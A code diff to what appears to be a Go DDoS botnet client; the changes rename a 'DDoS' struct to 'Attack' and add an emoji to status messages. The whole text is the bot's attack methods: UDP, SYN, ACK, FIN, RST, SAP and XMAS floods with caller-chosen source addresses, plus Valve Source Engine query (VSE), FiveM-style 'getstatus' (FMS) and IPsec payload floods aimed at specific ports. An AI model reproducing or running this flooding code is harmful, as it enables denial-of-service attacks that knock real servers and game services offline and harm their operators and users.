@@ -18,76 +18,76 @@ func makeBuffer(size string) []byte {
 }
 
 func (b *Bot) UDP(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
 		ddosPayload: makeBuffer(size),
 	}
-	d.udpPacket()
+	a.udpPacket()
 	if ReportSwitch {
-		b.Report("STOP UDP FLOOD ATTACKING.")
+		b.Report("🛎 STOP UDP FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) SYN(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
 		ddosPayload: makeBuffer(size),
 		synFlag:     true,
 	}
-	d.tcpPacket()
+	a.tcpPacket()
 	if ReportSwitch {
-		b.Report("STOP SYN FLOOD ATTACKING.")
+		b.Report("🛎 STOP SYN FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) ACK(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
 		ddosPayload: makeBuffer(size),
 		ackFlag:     true,
 	}
-	d.tcpPacket()
+	a.tcpPacket()
 	if ReportSwitch {
-		b.Report("STOP ACK FLOOD ATTACKING.")
+		b.Report("🛎 STOP ACK FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) FIN(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
 		ddosPayload: makeBuffer(size),
 		finFlag:     true,
 	}
-	d.tcpPacket()
+	a.tcpPacket()
 	if ReportSwitch {
-		b.Report("STOP FIN FLOOD ATTACKING.")
+		b.Report("🛎 STOP FIN FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) RST(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
 		ddosPayload: makeBuffer(size),
 		rstFlag:     true,
 	}
-	d.tcpPacket()
+	a.tcpPacket()
 	if ReportSwitch {
-		b.Report("STOP RST FLOOD ATTACKING.")
+		b.Report("🛎 STOP RST FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) SAP(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
@@ -95,14 +95,14 @@ func (b *Bot) SAP(srcIP, dstIP, dstPort, size string) {
 		synFlag:     true,
 		ackFlag:     true,
 	}
-	d.tcpPacket()
+	a.tcpPacket()
 	if ReportSwitch {
-		b.Report("STOP SAP FLOOD ATTACKING.")
+		b.Report("🛎 STOP SAP FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) XMAS(srcIP, dstIP, dstPort, size string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     dstPort,
@@ -114,47 +114,47 @@ func (b *Bot) XMAS(srcIP, dstIP, dstPort, size string) {
 		finFlag:     true,
 		urgFlag:     true,
 	}
-	d.tcpPacket()
+	a.tcpPacket()
 	if ReportSwitch {
-		b.Report("STOP XMAS FLOOD ATTACKING.")
+		b.Report("🛎 STOP XMAS FLOOD ATTACKING.")
 	}
 }
 
 func (b *Bot) VSE(srcIP, dstIP string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		dstPort:     "27015",
 		ddosPayload: convBytes(queryPrefix + "TSource Engine Query"),
 	}
-	d.udpPacket()
+	a.udpPacket()
 	if ReportSwitch {
-		b.Report("STOP VSE ATTACKING.")
+		b.Report("🛎 STOP VSE ATTACKING.")
 	}
 }
 
 func (b *Bot) FMS(srcIP, dstIP string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		ddosPayload: convBytes(queryPrefix + "getstatus"),
 		dstPort:     "30120",
 	}
-	d.udpPacket()
+	a.udpPacket()
 	if ReportSwitch {
-		b.Report("STOP FMS ATTACKING.")
+		b.Report("🛎 STOP FMS ATTACKING.")
 	}
 }
 
 func (b *Bot) IPSEC(srcIP, dstIP string) {
-	d := &DDoS{
+	a := &Attack{
 		srcAddr:     srcIP,
 		dstAddr:     dstIP,
 		ddosPayload: convBytes("\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"),
 		dstPort:     "500",
 	}
-	d.udpPacket()
+	a.udpPacket()
 	if ReportSwitch {
-		b.Report("STOP IPSEC ATTACKING.")
+		b.Report("🛎 STOP IPSEC ATTACKING.")
 	}
 }
